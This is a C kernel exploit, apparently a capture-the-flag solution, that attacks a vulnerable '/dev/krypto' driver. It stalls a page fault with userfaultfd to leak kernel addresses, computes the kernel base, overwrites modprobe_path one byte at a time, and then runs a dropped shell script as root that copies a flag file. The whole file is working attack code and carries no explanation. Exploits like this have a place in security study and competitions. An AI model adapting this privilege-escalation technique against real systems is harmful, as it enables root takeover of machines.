#include <stdlib.h>
#include <sys/shm.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>

uint64_t swap_uint64( uint64_t val )
{
    val = ((val << 8) & 0xFF00FF00FF00FF00ULL ) | ((val >> 8) & 0x00FF00FF00FF00FFULL );
    val = ((val << 16) & 0xFFFF0000FFFF0000ULL ) | ((val >> 16) & 0x0000FFFF0000FFFFULL );
    return (val << 32) | (val >> 32);
}


typedef unsigned long long ll;

unsigned long long rdtsc(void)
{
  unsigned hi, lo;
  __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
  return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}

typedef struct rng_params {
    char *buf;
    volatile size_t buf_len;
} rng;

rng g_rng;
int g_uffd;


char buffer[0x2000];

volatile int flag = 0;
#define A_SZ 0x20
#define B_SZ 0x300

void* alloc_thread(void* ptr) {
  #define FDS 0x10
  int* fds = malloc(FDS * sizeof(int));
  int cnt = 0;
  while(1) {
    int fd = open("/proc/self/stat", O_RDONLY);
    if (fd == -1 || cnt >= FDS) {
      if (fd != -1) close(fd);
      //puts("cleared fds");
      for (int i = 0; i < cnt; i++) {
        close(fds[i]);
      }
      cnt = 0;
    } else {
      fds[cnt] = fd;
      cnt++;
    }
  }
}

void* thread_fn(void* ptr) {
  flag = 1;
  int idx = 0;
  while (1) {
    idx++;
    if (idx & 1) {
      g_rng.buf_len = B_SZ;
    } else {
      g_rng.buf_len = A_SZ;
    }
  }

  return NULL;
}


ll profile(int fd) {
	rng a;
  a.buf = buffer;
  a.buf_len = 0;

  ll start = rdtsc();
  ioctl(fd, 0x1337, &a);
  ll end = rdtsc();

  return end - start;
}

void error(char* msg) {
  puts(msg);
  exit(1);
}

#define SHMS 10
void* uffd_thread(void* x) {
	int       shm_ids[SHMS];
	key_t     mem_key = 0x1337;

  for (int i = 0; i < SHMS; i++) {
    int shm_id = shmget(mem_key + SHMS, 4*sizeof(int), IPC_CREAT | 0666);
    if (shm_id < 0) {
       printf("*** shmget error (server) ***\n");
       exit(1);
    }
    shm_ids[i] = shm_id;
  }

  char write_buf[0x1000];
  memset(write_buf, 0, sizeof(write_buf));

  //printf("uffd thread using: %d\n", g_uffd);

  int time = 0;

  struct pollfd evt = { .fd = g_uffd, .events = POLLIN };
  while (poll(&evt, 1, 10) > 0) {
    /* unexpected poll events */
    if (evt.revents & POLLERR) {
      perror("poll");
      exit(-1);
    } else if (evt.revents & POLLHUP) {
      perror("pollhup");
      exit(-1);
    }
    struct uffd_msg fault_msg = {0};
    if (read(g_uffd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
      perror("read");
      exit(-1);
    }
    char *place = (char *)fault_msg.arg.pagefault.address;
    if (fault_msg.event != UFFD_EVENT_PAGEFAULT) {
      fprintf(stderr, "unexpected pagefault?.\n");
      exit(-1);
    }
    if ((ll) place - 0xdead000 < 0x2000) {
      //printf("got fault at: %p\n", place);

      if (time == 0) {
        time++;
        for (int i = 0; i < 20; i++) {
					/*if (open("/proc/self/stat", O_RDONLY) == -1) {
            puts("stat error!");
          }*/
        }
        ((ll*)write_buf)[0] = 0x20;
      } else {
        for (int i = 0; i < SHMS; i++) {
          if ((ll) shmat(shm_ids[i], NULL, 0) == -1) puts("shmat error!");
        }
        ((ll*)write_buf)[0x1000 / 8 - 1] = (ll) buffer;
        ((ll*) ((ll) place + 0x1000))[0] = 0x1000;
      }

			struct uffdio_copy copy = {
				.dst = (long) place,
				.src = (long) write_buf,
				.len = 0x1000
			};
			if (ioctl(g_uffd, UFFDIO_COPY, &copy) < 0) {
				perror("ioctl(UFFDIO_COPY)");
				exit(-1);
			}
    } else {
      printf("ignoring fault at: %p\n", place);
    }
  }
  return NULL;
}

int main() {
  memset(buffer, 0, sizeof(buffer));

  int fd = open("/dev/krypto", O_RDONLY);
  //printf("got fd: %d\n", fd);

  int uffd = syscall(SYS_userfaultfd, O_NONBLOCK);
  if (uffd == -1) error("uffd -1");

	//printf("got uffd: %d\n", uffd);

	struct uffdio_api api = { .api = UFFD_API };
	if (ioctl(uffd, UFFDIO_API, &api)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
		exit(-1);
	}

	if (api.api != UFFD_API) {
		fprintf(stderr, "++ unexepcted UFFD api version.\n");
		exit(-1);
	}

  long memsize = 0x2000;
	void *pages = mmap((void *)0xdead000, memsize, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (pages == MAP_FAILED) error("mmap failed");

	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (long) pages,
			.len = memsize
		}
	};

	if (ioctl(uffd, UFFDIO_REGISTER,  &reg)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
		exit(-1);
	}
	if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
		fprintf(stderr, "++ unexpected UFFD ioctls.\n");
		exit(-1);
	}

  g_uffd = uffd;

  pthread_t thread_id;
  pthread_create(&thread_id, NULL, uffd_thread, NULL);

  if (0 > ioctl(fd, 0x1337, 0xff8 + (ll) pages)) {
    puts("error!");
  }

  ll modprobe = -1;

  for (int i = 0; i < 0x1000 / 8; i++) {
    ll curr = ((ll*) buffer)[i];
    ll curr2 = ((ll*) buffer)[i + 2];

    if (curr % 0x10000 == 0xea80) {
      ll kbase = curr - 0x172ea80;
      ll kbase2 = curr2 - 0x1071300;

      if (kbase != kbase2) {
        printf("kbase ne: %llx %llx\n", kbase, kbase2);
        continue;
      }

      modprobe = 0x165f860 + kbase;
      printf("got kbase: %llx %llx\n", kbase, modprobe);

      break;
    }
  }

  if (modprobe == -1) {
    puts("modprobe not found");
    exit(1);
  }

  int guess_fd = open("/dev/krypto", O_RDONLY);
  int writer_fd = open("/dev/krypto", O_RDONLY);

  char* goal = "/tmp/x";
  int goal_len = strlen(goal) + 1;
  int goal_idx = 0;

  char guess_buff[0x10];

  rng guess_rng;
  while (goal_idx < goal_len) {
    guess_rng.buf = guess_buff;
    guess_rng.buf_len = 1;
    if (0 > ioctl(guess_fd, 0x1337, &guess_rng)) {
      puts("guess fd error");
      exit(1);
    }

    if (guess_buff[0] == goal[goal_idx]) {
      guess_rng.buf = (void*) (modprobe + goal_idx);
      guess_rng.buf_len = 1;

      goal_idx++;
    } else {
      guess_rng.buf = guess_buff;
      guess_rng.buf_len = 1;
    }

    if (0 > ioctl(writer_fd, 0x1337, &guess_rng)) {
      puts("guess fd error");
      exit(1);
    }
  }

  puts("finished writing??");

  int sres = 0;

	sres = system("echo '#!/bin/sh\ntouch /tmp/pwned\ncp /home/vagrant/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
	sres = system("chmod +x /tmp/x");

  int dfd = open("/tmp/dummy", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
  sres = write(dfd, "\xff\xff\xff\xff", 4);
  close(dfd);

	sres = system("chmod +x /tmp/dummy");

	sres = system("/tmp/dummy");

	sres = system("cat /tmp/flag");

  (void) sres;


#if 0
  int TIMES = 50;
  ll tot = 0;
  for (int i = 0; i < TIMES; i++) {
    ll val = profile(fd);
    if (i > 10) tot += val;
  }

  tot /= (TIMES - 10);

  printf("using: %llx\n", tot);

  g_rng.buf = buffer;
  g_rng.buf_len = 0;

  pthread_t thread_id;
  pthread_create(&thread_id, NULL, thread_fn, NULL);

  pthread_t thread_id2;
  pthread_create(&thread_id2, NULL, alloc_thread, NULL);

  while (!flag) {}

  for (int iter = 0; iter < 500000; iter++) {
    memset(buffer, 1, sizeof(buffer));

    if (0 > ioctl(fd, 0x1337, &g_rng)) {
      puts("error!");
    }

    int idx = -1;
    for (int i = 0; i < sizeof(buffer) / 8; i++) {
      if (((ll*)buffer)[i] == 0x0101010101010101) {
        idx = i;
        break;
      }
    }

    if (idx == B_SZ / 8) {
      int valid = 0;
      for (int i = 0; i < sizeof(buffer); i++) {
        for (int j = 0; j < 7; j++) {
          if (buffer[i + j]) break;
          if (j == 7 - 1) valid = 1;
        }

        if (valid) {
          break;
        }
      }

      if (valid) {
        for (int i = A_SZ / 8; i < B_SZ / 8; i++) {
          printf("%llx\n", ((ll*) buffer)[i]);
        }
        //break;
      }
    } else {
      if (idx != A_SZ / 8) puts("error!");
    }
  }
#endif
}
